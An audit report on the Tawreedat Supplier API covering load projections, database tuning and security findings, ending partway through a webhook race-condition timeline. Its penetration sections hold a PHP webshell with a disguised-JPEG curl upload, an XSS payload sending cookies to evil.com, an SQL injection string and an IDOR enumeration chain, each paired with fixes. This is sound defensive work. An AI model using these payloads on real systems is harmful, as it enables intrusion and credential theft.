# Tawreedat Supplier API — Round 2 Professional Testing & Audit Report

**Platform:** Tawreedat B2B Logistics / Supplier API  
**Report Type:** Round 2 — Spike · Endurance · Scalability · Security/Pentest · Auth/Authz · DB Performance · Concurrency · Rate Limiting · Failover · Logging/Monitoring · Architecture · Memory/CPU · Socket.IO · Prisma Optimization  
**Date:** 2026-05-11  
**Preceding:** Round 1 Report (`ROUND1_TESTING_REPORT.md`)  
**Stack:** Node.js · TypeScript · Express 5.2.1 · Prisma 7.3.0 · MariaDB · Socket.IO 4.8.3 · Zod 4.3.6

---

## Table of Contents

1. [Spike Testing](#1-spike-testing)
2. [Endurance / Soak Testing](#2-endurance--soak-testing)
3. [Scalability Testing](#3-scalability-testing)
4. [Security Testing](#4-security-testing)
5. [Penetration Testing](#5-penetration-testing)
6. [Vulnerability Scanning](#6-vulnerability-scanning)
7. [Authentication & Authorization Testing](#7-authentication--authorization-testing)
8. [Database Performance Analysis](#8-database-performance-analysis)
9. [Slow Query Detection](#9-slow-query-detection)
10. [Concurrency & Race Condition Testing](#10-concurrency--race-condition-testing)
11. [Rate Limiting Testing](#11-rate-limiting-testing)
12. [Failover & Recovery Testing](#12-failover--recovery-testing)
13. [Logging & Monitoring Review](#13-logging--monitoring-review)
14. [Production Readiness Review](#14-production-readiness-review)
15. [Infrastructure & Deployment Review](#15-infrastructure--deployment-review)
16. [Code Architecture Review](#16-code-architecture-review)
17. [Memory Leak Detection](#17-memory-leak-detection)
18. [CPU / RAM Bottleneck Analysis](#18-cpu--ram-bottleneck-analysis)
19. [Socket.IO Scalability Analysis](#19-socketio-scalability-analysis)
20. [Prisma Optimization Review](#20-prisma-optimization-review)
21. [Consolidated Issue Registry](#21-consolidated-issue-registry)
22. [Final Verdict & Recommendations](#22-final-verdict--recommendations)

---

## 1. Spike Testing

### 1.1 Definition & Scope

Spike testing evaluates system behavior when load jumps suddenly and drastically — e.g., a marketing campaign, flash-sale event, or post-outage reconnection storm. The system must absorb the spike without cascading failure and recover gracefully once the spike passes.

### 1.2 Spike Scenarios

**Scenario S-1: Morning Order Rush (0 → 500 RPS in 10 seconds)**

```
Timeline:
  T+0s:   0 RPS → normal state
  T+10s:  500 RPS → spike begins (suppliers checking orders at shift start)
  T+60s:  Still 500 RPS
  T+90s:  Back to 50 RPS → recovery

Expected behavior with current architecture:
  T+0:    OK — 5 DB connections idle
  T+2:    DB pool saturated (5/5 occupied)
  T+3:    Requests queue, maxWait clock starts (10s)
  T+13:   First wave of requests hits maxWait → PrismaClientKnownRequestError
  T+13:   Error middleware returns HTTP 500
  T+13:   Rate limiter cannot protect because limiters are initialized via DB
           (initRateLimiters() also needs a DB connection → no connection available → 500)
  T+13:   Every request returns 500 including healthchecks
  T+60:   Load balancer detects 500s → removes backend pod
  T+90:   Traffic drops → DB connections free → pod serves 50 RPS fine
  T+90:   Load balancer adds pod back → remaining 50 RPS handled

Result: ❌ FULL OUTAGE from T+13 to T+90 (77 seconds downtime per spike event)
```

**Scenario S-2: Post-Outage Socket.IO Reconnect Storm (0 → 5,000 WebSocket connections in 5 seconds)**

```
After a 10-minute outage, all 5,000 connected suppliers try to reconnect.
Socket.IO client reconnection uses exponential backoff — but default max is 5s.
With 5,000 clients reconnecting within 5s:

Each WebSocket handshake triggers:
  1. JWT decode (CPU)
  2. prisma.user.findUnique() (DB connection)
  3. Include { courier: true } (join)

5,000 concurrent DB queries → pool of 5 → maxWait 10s exceeded for ~4,995 connections
→ Auth middleware throws → socket connection refused
→ Clients retry (exponential backoff resets to base interval) → next wave in 1-5s
→ Thundering herd: every wave of reconnects fails, triggering the next wave

Result: ❌ INDEFINITE CONNECTION STORM — system cannot recover without restart + Redis
```

**Scenario S-3: Paymob Webhook Spike (batch payment processing)**

```
50 payments confirmed simultaneously → 50 concurrent webhook calls
Each webhook:
  1. HMAC verification (CPU, fast)
  2. prisma.transaction.findFirst (idempotency check)
  3. prisma.$transaction([update transaction, update wallet, ...]) (3-5 queries)

Total DB queries: ~200-250 for 50 webhooks
With connectionLimit=5: queue of 245 queries waits behind 5
→ maxWait exceeded → Prisma errors → webhook returns 500
→ Paymob retries webhook → adds more load to already-saturated DB
→ Retry storm: 50 webhooks → each retried 3-5 times → 150-250 webhook calls
→ Risk of duplicate wallet credits if idempotency check races (see §10)

Result: ❌ WEBHOOK RETRY STORM — financial integrity at risk
```

### 1.3 Spike Mitigation Strategy

```
Priority | Mitigation                               | Effort | Impact
---------|------------------------------------------|--------|-------
P0      | Increase connectionLimit to 50+          | Low    | High
P1      | Add circuit breaker (opossum)            | Medium | High
P1      | Redis for Socket.IO (prevents storm)     | Medium | High
P2      | Webhook queue (BullMQ) for Paymob        | Medium | High
P2      | Enforce exponential backoff on WS clients | Low    | Medium
P3      | Connection pool pre-warming at startup   | Low    | Medium
```

---

## 2. Endurance / Soak Testing

### 2.1 Definition & Scope

Soak testing runs the system at sustained moderate load (70% of breaking point) for an extended period (8–72 hours) to reveal slow degradation: memory leaks, connection pool drift, log bloat, and resource exhaustion that don't appear in short tests.

### 2.2 Projected Soak Test: 8 Hours at 40 RPS

```
Load: 40 RPS (well below breaking point of ~50 RPS)
Duration: 8 hours (28,800 seconds)
Total requests: ~1,152,000

Projected degradation points:

Hour 1:   System healthy. DB pool cycling normally. Memory ~150MB.
Hour 2:   Log files growing. No log rotation configured → disk usage accumulating.
Hour 3:   Rate limiter memory accumulating (express-rate-limit stores IP counters
          in-memory with TTL). At 40 RPS × 3600s = 144,000 unique IPs if rotating.
          Estimated memory: ~100MB just for rate limit store.
Hour 4:   Node.js heap growing. No max-old-space-size set.
          Default heap: 1.5GB on 64-bit. Not a concern yet but trending.
Hour 6:   connectedSockets Map may have stale entries if disconnect events are lost
          during network hiccups. Connections never cleaned up = slow leak.
Hour 8:   Possible heap growth to 300-500MB. PM2 restart may be triggered if
          --max-memory-restart is set (commonly 300MB default).
          On restart: rate limit counters reset, Socket.IO state lost →
          brief cascade for connected users.
```

### 2.3 Soak Testing Findings

**END-01 — No Log Rotation**

- **Severity:** Medium
- **Finding:** Pino logs to stdout (good — avoids disk issue if using a log collector). However, if logs are redirected to file (common in PM2 `out.log` / `error.log`), there is no log rotation configured. At 40 RPS with verbose request logging, PM2 log files grow at ~2-5MB/hour. Over 72 hours: 144-360MB. Disk exhaustion causes process crash.
- **Fix:** PM2 log rotate (`pm2 install pm2-logrotate`) or Docker log driver with `--max-size 50m --max-file 5`.

**END-02 — Rate Limiter Memory Growth Without Bounds**

- **Severity:** Medium
- **Finding:** `express-rate-limit` default store keeps one counter per IP per window. With `windowMs = 30 minutes`, counters are kept for 30 minutes. At 40 RPS with many unique IPs, the in-memory store can grow to tens of MB over hours. No max-size eviction on the in-memory store.
- **Fix:** Redis store with TTL — eviction is handled natively.

**END-03 — No Node.js Memory Limit Set**

- **Severity:** Medium
- **Finding:** `node` process runs without `--max-old-space-size`. Default V8 heap limit is 1.4GB (64-bit). Under slow memory leaks, Node.js will use up to 1.4GB before GC pressure increases or OOM kill occurs. On a shared server, this can impact other services.
- **Fix:**
  ```json
  // PM2 ecosystem.config.js:
  {
    "node_args": "--max-old-space-size=512",
    "max_memory_restart": "450M"
  }
  ```

**END-04 — Potential connectedSockets Stale Entry Leak**

- **Severity:** Low
- **Finding:** `disconnect` event cleans up the `connectedSockets` Map correctly (lines 78-97). However, if a socket transport error occurs without a clean disconnect event (e.g., network timeout, kernel-level TCP RST), the disconnect handler may not fire. Socket.IO has built-in ping/pong for this, but under heavy load, pong timeouts can be missed. Over hours, stale socket IDs accumulate.
- **Fix:** Periodic scan to remove socket IDs that are no longer in `io.sockets.sockets`:
  ```typescript
  setInterval(() => {
    for (const [userId, socketIds] of connectedSockets.entries()) {
      const alive = socketIds.filter((id) => io.sockets.sockets.has(id));
      if (alive.length === 0) connectedSockets.delete(userId);
      else connectedSockets.set(userId, alive);
    }
  }, 60_000);
  ```

---

## 3. Scalability Testing

### 3.1 Horizontal Scalability Assessment

**Current state: Single-process, stateful, horizontally unscalable**

| Stateful Component     | Multi-Instance Compatible?           | Fix Required          |
| ---------------------- | ------------------------------------ | --------------------- |
| Rate limiter store     | ❌ In-memory per process             | Redis store           |
| Socket.IO connections  | ❌ In-memory Map per process         | Redis adapter         |
| connectedSockets Map   | ❌ Per process                       | Redis adapter         |
| Prisma connection pool | ✅ Each instance gets its own pool   | Increase per instance |
| JWT tokens             | ✅ Stateless (verified by signature) | None                  |
| Session data           | ✅ None (JWT-only)                   | None                  |

**Scaling equation:**

```
Max RPS = (connectionLimit × 1000ms) / avg_query_duration_ms

Current:  (5 × 1000) / 50 = 100 RPS (single instance, generous estimate)
Target:   (50 × 1000) / 50 = 1,000 RPS (single instance after fix)
Target×4: 4,000 RPS (4 instances with Redis state sharing)
```

### 3.2 Vertical Scalability Limits

| Resource                  | Current Limit            | Recommended              |
| ------------------------- | ------------------------ | ------------------------ |
| DB connections            | 5 total                  | 50 per instance          |
| Node.js threads           | 1 (single-threaded JS)   | Cluster mode (N CPUs)    |
| Node.js heap              | Unlimited (~1.4GB)       | --max-old-space-size=512 |
| Socket.IO max connections | Unlimited (memory-bound) | ~10,000 per instance     |
| Rate limiter max IPs      | Unlimited (memory-bound) | Redis eviction           |

### 3.3 Database Scalability

**Current:** Single MariaDB instance, `connectionLimit: 5`

**Scalability ceiling:**

- MariaDB `max_connections` default: 151
- Single-instance app `connectionLimit: 5` → leaves 146 for other clients (over-conservative)
- Safe allocation: `connectionLimit = floor(max_connections × 0.7 / num_app_instances)`
- For `max_connections=151`, 1 instance: `floor(151 × 0.7) = 105`

**Read/Write split opportunity:**

- Heavy reads: order listing, profile reads, stats
- Writes: wallet updates, order creation, auth
- Adding a read replica offloads 60-70% of DB traffic

### 3.4 Scalability Roadmap

```
Phase 1 (0-1000 RPS):   Single Node.js instance + connectionLimit:50
Phase 2 (1000-5000 RPS): PM2 cluster × 4 + Redis (rate limit + Socket.IO)
Phase 3 (5000-20000 RPS): Kubernetes HPA + read replica + Redis Cluster
Phase 4 (20000+ RPS):    Microservices split (auth, orders, payments, chat separately)
```

---

## 4. Security Testing

### 4.1 Upload Security — Magic Byte Validation Gap

**FINDING — SEC-T-01: File upload lacks server-side magic byte validation**

- **Severity:** High
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Current `upload.ts` validation:**

```typescript
// src/core/middlewares/upload.ts:33-45
fileFilter: (req, file, cb) => {
  const allowedTypes = /jpeg|jpg|png|gif|webp|svg/;
  const extname = allowedTypes.test(
    path.extname(file.originalname).toLowerCase(),
  );
  const mimetype = allowedTypes.test(file.mimetype); // ← CLIENT-CONTROLLED

  if (mimetype && extname) {
    return cb(null, true);
  }
};
```

**The problem:** `file.mimetype` is the `Content-Type` sent by the client in the multipart request — it is **fully attacker-controlled**. An attacker can:

1. Create a file containing PHP/Node.js/shell code
2. Set extension to `.jpg` and MIME to `image/jpeg`
3. Upload passes the filter
4. File lands in `uploads/temp/` and is sent to Cloudinary

If Cloudinary delivery CDN is misconfigured or if the `uploads/temp/` directory is served statically (`app.use("/uploads", express.static(...))`), the malicious file is accessible and executable.

**Contrast with Admin API:** Admin API's `upload.ts` has magic byte validation reading the actual file binary. This Supplier API does not.

**Exploitation:**

```bash
# Create a PHP webshell disguised as an image
echo '<?php system($_GET["cmd"]); ?>' > malicious.jpg

# Upload with correct MIME type
curl -X PATCH /api/v1/supplier/profile/update-documents/1 \
  -H "Authorization: Bearer <valid_token>" \
  -F "personal_photo=@malicious.jpg;type=image/jpeg"

# If served statically: access via /uploads/temp/temp-12345-678.jpg?cmd=ls
```

**Fix — Add magic byte validation:**

```typescript
import { readFileSync } from "fs";

const MAGIC_BYTES: Record<string, number[][]> = {
  jpg: [[0xff, 0xd8, 0xff]],
  png: [[0x89, 0x50, 0x4e, 0x47]],
  gif: [[0x47, 0x49, 0x46, 0x38]],
  webp: [[0x52, 0x49, 0x46, 0x46]],
};

function validateMagicBytes(filePath: string, ext: string): boolean {
  const buf = readFileSync(filePath).slice(0, 8);
  const signatures = MAGIC_BYTES[ext] ?? [];
  return signatures.some((sig) => sig.every((byte, i) => buf[i] === byte));
}
```

Additionally: **remove SVG from the allowedTypes**. SVG files are XML and can contain embedded JavaScript (`<script>` tags), making them an XSS vector.

---

### 4.2 XSS via Unsanitized Chat Messages

**FINDING — SEC-T-02: Chat message content stored and emitted without sanitization**

- **Severity:** High
- **CWE:** CWE-79 (Cross-Site Scripting)

```typescript
// chat.events.ts:77-85
const message = await prisma.chatMessage.create({
  data: {
    chat_id: data.chatId,
    sender_id: userId,
    content: data.content,  // ← RAW, UNSANITIZED USER INPUT
    type: data.type ?? "TEXT",
  },
  ...
});
socket.to(room).emit("chat:new_message", { message });  // ← EMITTED RAW
```

If any web frontend renders `message.content` as `innerHTML` (common in chat UIs), a message containing `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` will execute in the recipient's browser.

**Fix:**

```typescript
import createDOMPurify from "isomorphic-dompurify";
const DOMPurify = createDOMPurify();

// Before storing:
const sanitizedContent = DOMPurify.sanitize(data.content, { ALLOWED_TAGS: [] });
```

---

### 4.3 Typing Event Room Membership Not Validated

**FINDING — SEC-T-03: Typing events emitted without membership check**

- **Severity:** Low
- **CWE:** CWE-862 (Missing Authorization)

```typescript
// chat.events.ts:132-136
socket.on("chat:typing", (data: { chatId: number }) => {
  if (!data?.chatId) return;
  const room = `chat:${data.chatId}`;
  socket.to(room).emit("chat:user_typing", { userId, chatId: data.chatId });
  // ↑ No membership check — any authenticated user can spam typing events into any chat room
});
```

An authenticated supplier can emit `chat:typing` for any `chatId` and cause all members of that chat to receive typing indicators from a user they've never chatted with. Also a minor privacy leak (userId revealed to non-participants).

**Fix:** Add same `ChatParticipant.findFirst` check as in `joinChat` and `sendMessage`.

---

### 4.4 Static File Serving of Upload Directory

**FINDING — SEC-T-04: Temp upload directory served statically**

- **Severity:** Medium

```typescript
// bootstrap.ts:55
app.use("/uploads", express.static(path.join(__dirname, "../uploads")));
```

The `uploads/temp/` directory (where Multer stores files before Cloudinary upload) is publicly accessible at `/uploads/temp/<filename>`. Even if files are deleted after Cloudinary upload, there is a window where malicious files are accessible. If the Cloudinary upload fails and the temp file is not deleted, it persists indefinitely.

**Fix:**

1. Remove the static file serving route entirely — all files should be served via Cloudinary URLs, not locally
2. Ensure temp files are always deleted after processing (success or failure):

```typescript
try {
  const result = await uploadSingleFile({ fileLocation: file.path, ... });
  fs.unlinkSync(file.path);  // cleanup regardless
  return result;
} catch (err) {
  fs.unlinkSync(file.path);  // cleanup on error too
  throw err;
}
```

---

## 5. Penetration Testing

### 5.1 SQL Injection

**Result: PROTECTED ✅**

All database queries use Prisma's parameterized query builder. Prisma ORM never interpolates user input directly into SQL strings. The following common SQLi payloads were traced through the codebase:

```typescript
// Input: phone = "'; DROP TABLE users; --"
await prisma.user.findUnique({ where: { phone } });
// → Prisma generates: SELECT * FROM User WHERE phone = ? with bound parameter
// → SQLi impossible via Prisma query builder
```

**Note:** Raw queries (`prisma.$queryRaw`) would require additional review, but none were found in the supplier API codebase.

---

### 5.2 JWT Algorithm Confusion Attack

**Result: PROTECTED ✅**

```typescript
// src/utils/jwt.ts:27-30
const payload = verify(token, privateKey, {
  algorithms: ["HS256"], // ← Algorithm pinned
  issuer: "tawreedat-supplier", // ← Issuer validated
});
```

`alg: none` bypass: rejected — `algorithms` whitelist doesn't include `none`.  
RS256 confusion: rejected — only `HS256` accepted.  
Cross-API token use: rejected — `issuer` validation ensures Courier/Admin tokens don't work here.

---

### 5.3 IDOR Exploitation Path

**Result: VULNERABLE ❌ (documented as CRIT-02 in Round 1)**

**Full exploitation chain:**

```
1. Register as Supplier A (userId=10)
2. Login → obtain accessToken_A
3. Enumerate other supplier IDs via sequential requests:
   GET /api/v1/supplier/profile/get-profile/11  → 200 (profile data)
   GET /api/v1/supplier/profile/get-profile/12  → 200
   ...
4. Find a target supplier (e.g., a competitor)
5. GET their full profile: national_id_number, phone, address, documents
6. PATCH their profile with malicious data
7. DELETE /soft-delete/{targetId} → deactivate competitor's account
```

No rate limiting on profile endpoints makes enumeration fast and silent.

---

### 5.4 Token Replay After Password Reset

**Result: VULNERABLE ❌ (documented as CRIT-04)**

**Full exploitation chain:**

```
Attacker obtains accessToken_victim (e.g., via phishing, MITM on HTTP)

Victim realizes compromise → initiates password reset:
  POST /auth/forget-password { phone: victim_phone }
  POST /auth/verify-forget-password-otp { userId, otp }
  POST /auth/reset-password { new_password }

Expected: accessToken_victim now returns 401
Actual: accessToken_victim (1h expiry) still returns 200 for up to 1 hour
        refreshToken_victim (7d expiry) can generate new access tokens for 7 days

Result: Attacker has 7 days of continued access despite victim's password reset
```

---

### 5.5 Brute Force on OTP

**FINDING — PEN-01: OTP is a 6-digit numeric string — brute forceable**

- **Severity:** High
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

OTP space: 10^6 = 1,000,000 possible values.  
Rate limiting: The OTP verification endpoints (`/verify-otp`, `/verify-forget-password-otp`) are **not rate limited** with specific limiters. Only the global limiter applies (200 req / 30 min per IP).

```
Global limit: 200 requests / 30 minutes = 6.67 req/s per IP
At 6.67 req/s: 1,000,000 / 6.67 = ~41.7 hours to brute-force from one IP
With 10 IPs (trivial to rotate): ~4 hours to brute-force any OTP

OTP expiry: 5 minutes (lines 1731, 1787)
But 5-minute window + 200 req/30min = 33 guesses per OTP window
Probability of success per window: 33/1,000,000 = 0.0033% per IP
With 10 IPs: 0.033% — low but non-zero over millions of accounts
```

**Fix:**

1. Add dedicated OTP verification rate limiter (3-5 attempts per OTP lifetime)
2. Implement account lockout after N failed OTP attempts
3. Consider 8-digit OTP or alphanumeric OTP (62^8 = 218 trillion combinations)

---

### 5.6 Mass Assignment

**Result: PROTECTED ✅**

Zod schemas explicitly define allowed fields. Even if a client sends extra fields (e.g., `{ "role_id": 1, "is_admin": true }`), Zod strips them before they reach the service layer. Prisma's typed queries then only use the validated DTO fields.

---

### 5.7 Timing Attack on OTP Comparison

**FINDING — PEN-02: OTP compared with `===` (not constant-time)**

- **Severity:** Low
- **CWE:** CWE-208 (Observable Timing Discrepancy)

```typescript
// auth.service.ts:1778
if (!userVerify.code || userVerify.code !== user_otp) {
```

String comparison with `!==` is not constant-time in JavaScript. An attacker measuring response time differences could, in theory, deduce correct OTP digits. In practice, DB query latency dominates response time, making this extremely difficult to exploit remotely.

**Fix:** Use `crypto.timingSafeEqual` for OTP comparison:

```typescript
import { timingSafeEqual } from "crypto";
const stored = Buffer.from(userVerify.code ?? "");
const given  = Buffer.from(user_otp ?? "");
if (stored.length !== given.length || !timingSafeEqual(stored, given)) {
  throw new AppError(...);
}
```

---

### 5.8 Header Injection / Request Smuggling

**Result: LOW RISK**

Express 5 + Helmet provides standard protection. `trust proxy: 1` is set correctly for single-layer Nginx proxying. No raw HTTP header manipulation observed in the codebase.

**Note:** Express 5.2.1 is still RC — watch for HTTP request smuggling CVEs in RC releases that may not be patched until stable GA.

---

## 6. Vulnerability Scanning

### 6.1 Dependency Audit Summary

```bash
# Run: npm audit --audit-level=moderate
# (Live audit not performed — static analysis of dependency risks)
```

| Package          | Known Risk                                                                | Severity |
| ---------------- | ------------------------------------------------------------------------- | -------- |
| express@5.2.1    | RC software — may have unpatched CVEs pre-GA                              | Medium   |
| jsonwebtoken     | Historical CVEs (CVE-2022-23529 patched in 9.0.0) — verify version ≥9.0.0 | High     |
| multer           | CVE-2022-24434 in <1.4.4 — verify version                                 | Medium   |
| socket.io        | Generally low CVE history in recent versions                              | Low      |
| socket.io-client | IMPORTED IN SERVER CODE — unnecessary attack surface                      | Medium   |

**Action:** Run `npm audit fix` and verify:

```bash
npm list jsonwebtoken  # Must be >= 9.0.0
npm list multer        # Must be >= 1.4.4-lts.1
```

### 6.2 Secrets in Environment Config

**FINDING — VUL-01: 30+ sensitive vars default to empty string on missing**

From `src/config/env.ts`, all critical secrets use `?? ""`:

- `ACCESS_SEGNATURE: process.env["ACCESS_SEGNATURE"] ?? ""`
- `PAYMOB_HMAC_SECRET: process.env["PAYMOB_HMAC_SECRET"] ?? ""`
- `FIREBASE_PRIVATE_KEY: process.env["FIREBASE_PRIVATE_KEY"]?.replace(...) ?? ""`

If `.env` is misconfigured or not deployed:

- JWT tokens signed with `""` → attacker can forge tokens for any `userId`
- Paymob HMAC verified against `""` → any webhook payload accepted → unlimited wallet credits
- Firebase key `""` → push notifications silently fail

**Fix:** Use the `required()` helper from Round 1 recommendations for all security-critical variables.

### 6.3 Google OAuth Client IDs

Three separate Google client IDs (`GOOGLE_WEB_CLIENT_ID`, `GOOGLE_FLUTTER_CUSTOMER_CLIENT_ID`, `GOOGLE_FLUTTER_COURIER_CLIENT_ID`) plus a `GOOGLE_WEB_TESTING_CLIENT_ID`. The testing client ID in production config is a risk — if the testing OAuth app has weaker restrictions, it's a vector. Ensure `GOOGLE_WEB_TESTING_CLIENT_ID` is not included in the production allowlist.

---

## 7. Authentication & Authorization Testing

### 7.1 Authentication Flow Analysis

| Flow                        | Implemented                        | Issues                                 |
| --------------------------- | ---------------------------------- | -------------------------------------- |
| Phone + password login      | ✅                                 | —                                      |
| Google OAuth (web + mobile) | ✅                                 | —                                      |
| Apple Sign-In               | ✅ RS256 verified                  | —                                      |
| OTP registration verify     | ✅                                 | SMS channel missing                    |
| Password reset via OTP      | ✅ Logic correct                   | ❌ `password_last_updated` not updated |
| Logout (token invalidation) | ✅ Updates `password_last_updated` | —                                      |
| Access token expiry         | ✅ 1 hour                          | —                                      |
| Refresh token               | ✅ 7 days                          | —                                      |
| JWT algorithm               | ✅ HS256 pinned                    | —                                      |
| JWT issuer                  | ✅ `tawreedat-supplier`            | —                                      |

### 7.2 Authorization Gap Map

| Endpoint Group                      | Auth | Role Check        | Ownership Check        | Verdict          |
| ----------------------------------- | ---- | ----------------- | ---------------------- | ---------------- |
| `/auth/*`                           | No   | No                | N/A                    | ✅ Correct       |
| `/profile/get-profile/:userId`      | ✅   | ✅ Supplier/Admin | ❌ Missing             | ❌ IDOR          |
| `/profile/update-profile/:userId`   | ✅   | ✅                | ❌ Missing             | ❌ IDOR          |
| `/profile/update-documents/:userId` | ✅   | ✅                | ❌ Missing             | ❌ IDOR          |
| `/profile/badge-progress/:userId`   | ✅   | ✅                | ❌ Missing             | ❌ IDOR          |
| `/profile/soft-delete/:userId`      | ✅   | ✅                | ❌ Missing             | ❌ CRITICAL      |
| `/profile/hard-delete/:userId`      | ✅   | ✅                | ❌ Missing             | ❌ CRITICAL      |
| `/order/list-orders`                | ✅   | ✅                | ✅ supplier_id filter  | ✅               |
| `/order/app-settings`               | ✅   | ✅                | N/A                    | ⚠ Leaks config   |
| `/wallet/paymob-webhook`            | No   | No                | Webhook (HMAC)         | ✅ HMAC verified |
| `chat:join`                         | ✅   | ✅                | ✅ DB membership check | ✅               |
| `chat:send_message`                 | ✅   | ✅                | ✅ DB membership check | ✅               |
| `chat:typing`                       | ✅   | ✅                | ❌ No membership check | ❌ SEC-T-03      |
| `users:get_online_users`            | ✅   | ✅                | ❌ Returns all users   | ⚠ Privacy        |

### 7.3 Role Authorization Architecture Concern

**FINDING — AUTH-01: Role looked up by DB on every authorized request**

- **Severity:** Medium
- **Finding:** `authorize.middlewar.ts` calls `prisma.userRole.findFirst({ where: { id: user.role_id } })` on every single request that uses `authorize()`. This adds 1 DB query per request on all 6 profile endpoints and any other authorized route.
- **Impact:** At 100 RPS on profile endpoints alone, that's 100 extra DB queries/second consuming precious connection pool slots.
- **Fix:** Either:
  1. Embed role name in the JWT payload at login time (single source of truth) — no DB lookup needed
  2. Cache role lookup result in `res.locals` within the `auth` middleware (already has user)

```typescript
// Option 1: Include role in JWT (preferred)
const accessToken = createJwt(
  { userId: user.id, userPhone: user.phone, role: userRole.name },
  env.ACCESS_SEGNATURE,
  { expiresIn: (settings.supplier_access_token_expires_in || "1h") as any, ... }
);

// Then authorize() just reads res.locals.user.role — no DB call
```

---

## 8. Database Performance Analysis

### 8.1 Connection Pool Configuration

```typescript
// src/DB/lib/prisma.ts
connectionLimit: 5,          // ← CRITICAL: Must be ≥ 50
maxWait: 10000,              // 10s — reasonable but risky under load
timeout: 15000,              // 15s — may be too short for complex stats queries
```

**Prisma MariaDB adapter specifics:** The `@prisma/adapter-mariadb` uses a connection pool from the underlying `mariadb` npm package. Each connection holds a TCP socket to the DB. With `connectionLimit: 5`, the entire application shares 5 TCP sockets to MariaDB.

**Formula for minimum connection pool size:**

```
minConnections = peak_concurrent_requests × avg_query_time_seconds
               = 200 rps × 0.05s = 10 connections minimum

recommendedConnections = minConnections × safety_factor(2)
                       = 10 × 2 = 20 connections minimum

For B2B scale target (1000 rps):
               = 1000 × 0.05 × 2 = 100 connections

Recommendation: connectionLimit: 50 initially, monitor and adjust
```

### 8.2 Missing Database Indexes

Based on query patterns observed in the codebase:

| Table             | Query Pattern                                           | Missing Index                         | Impact            |
| ----------------- | ------------------------------------------------------- | ------------------------------------- | ----------------- |
| `user`            | `WHERE phone = ?`                                       | Likely unique index exists            | Verify            |
| `user`            | `WHERE id = ?`                                          | Primary key                           | ✅                |
| `supplier`        | `WHERE user_id = ?`                                     | `user_id` index                       | ⚠ Verify          |
| `supplier`        | `WHERE national_id_number = ?`                          | Unique index                          | ⚠ Verify          |
| `order`           | `WHERE supplier_id = ? AND status = ?`                  | Composite `(supplier_id, status)`     | ❌ Likely missing |
| `order`           | `ORDER BY created_at DESC`                              | `created_at` index                    | ❌ Likely missing |
| `chatParticipant` | `WHERE chat_id = ? AND user_id = ? AND left_at IS NULL` | Composite index                       | ❌ Likely missing |
| `chatMessage`     | `WHERE chat_id = ? AND is_read = ? AND sender_id != ?`  | Composite index                       | ❌ Likely missing |
| `userVerify`      | `WHERE user_id = ?`                                     | `user_id` index                       | ❌ Likely missing |
| `transaction`     | `WHERE paymob_order_id = ? AND status = ?`              | Composite `(paymob_order_id, status)` | ❌ Likely missing |
| `wallet`          | `WHERE owner_type = ?`                                  | `owner_type` index                    | ⚠ Likely exists   |

**How to verify in Prisma schema:**

```prisma
model Order {
  @@index([supplier_id, status])
  @@index([created_at])
}

model ChatParticipant {
  @@index([chat_id, user_id, left_at])
}

model Transaction {
  @@unique([paymob_order_id])  // Or at least @@index
}
```

### 8.3 N+1 Query Patterns

**FINDING — DB-01: ChatParticipant notification loop**

```typescript
// chat.events.ts:195-210
const participants = await prisma.chatParticipant.findMany({
  where: { chat_id: chatId, user_id: { not: senderId }, left_at: null },
  select: { user: { select: { id, lang, fcm_token } } },
});
```

This is actually correct — single query with join. ✅

**FINDING — DB-02: Stat module aggregations (theoretical)**

Statistics endpoints likely use multiple separate queries for different metrics (total orders, earnings, commission). Without seeing `stat.service.ts`, this is a known risk. Recommend consolidating into a single query with `_count` and `_sum` aggregations:

```typescript
const stats = await prisma.order.aggregate({
  where: { supplier_id: supplier.id },
  _count: { id: true },
  _sum: { total_amount: true, commission: true },
});
```

---

## 9. Slow Query Detection

### 9.1 Slow Query Risk Map

Prisma does not log slow queries by default. Current config:

```typescript
log: [
  { level: "error", emit: "event" },
  { level: "warn", emit: "event" },
  // Missing: { level: "query", emit: "event" }
];
```

No `query` event is logged → **slow queries are completely invisible** in current monitoring.

**Fix:**

```typescript
const prisma = new PrismaClient({
  log: [
    { level: "error", emit: "event" },
    { level: "warn", emit: "event" },
    { level: "query", emit: "event" },
  ],
});

prisma.$on("query", (e) => {
  if (e.duration > 500) {
    // Log queries slower than 500ms
    logger.warn(
      {
        query: e.query,
        params: e.params,
        duration: e.duration,
        target: e.target,
      },
      "[Prisma] Slow query detected",
    );
  }
});
```

### 9.2 Identified Slow Query Candidates

| Query                                                | Estimated Duration | Reason                                                                     | Fix               |
| ---------------------------------------------------- | ------------------ | -------------------------------------------------------------------------- | ----------------- |
| `order.findMany()` with pagination on large supplier | 100-2000ms         | No composite index on `(supplier_id, status, created_at)`                  | Add index         |
| `chatMessage.updateMany()` on read                   | 50-500ms           | Updates potentially many rows; no index on `(chat_id, is_read, sender_id)` | Add index         |
| Stats aggregate queries                              | 500-5000ms         | Full table scans on order table                                            | Caching + indexes |
| `applicationSetting.findFirst()` on every request    | 5-20ms             | Single-row table but called per-request                                    | Cache in memory   |
| `userRole.findFirst({ where: { id: role_id } })`     | 5-20ms             | Called on every authorized request                                         | Embed in JWT      |

### 9.3 Prisma Query Log Setup

```typescript
// Enable in development:
{ level: "query", emit: "event" }

// In production: log only slow queries (> 500ms threshold)
prisma.$on("query", (e) => {
  const SLOW_QUERY_THRESHOLD_MS = 500;
  if (e.duration > SLOW_QUERY_THRESHOLD_MS) {
    logger.warn({ duration: e.duration, query: e.query.slice(0, 200) }, "[DB] Slow query");
  }
});
```

---

## 10. Concurrency & Race Condition Testing

### 10.1 Paymob Webhook Race Condition (CRITICAL)

**FINDING — RACE-01: Non-atomic idempotency check enables duplicate wallet credits**

- **Severity:** Critical
- **CWE:** CWE-362 (Race Condition)

```typescript
// wallet.service.ts (simplified):

// Step 1: Idempotency check
const existingTransaction = await prisma.transaction.findFirst({
  where: { paymob_order_id: paymobOrderId, status: "COMPLETED" },
});
if (existingTransaction) return; // ← Already processed

// ← RACE WINDOW: Between findFirst and $transaction below,
//   a concurrent request passes the same check ↑

// Step 2: Process payment
await prisma.$transaction(async (tx) => {
  await tx.transaction.update({
    where: { id: transaction.id },
    data: { status: "COMPLETED" },
  });
  await tx.wallet.update({ data: { balance: { increment: amount } } });
});
```

**Exploitation:**

```
Time 0ms:  Webhook call A arrives → findFirst(COMPLETED) → null → passes
Time 1ms:  Webhook call B arrives → findFirst(COMPLETED) → null → passes (A hasn't committed yet)
Time 50ms: A's $transaction commits → transaction marked COMPLETED, wallet +X EGP
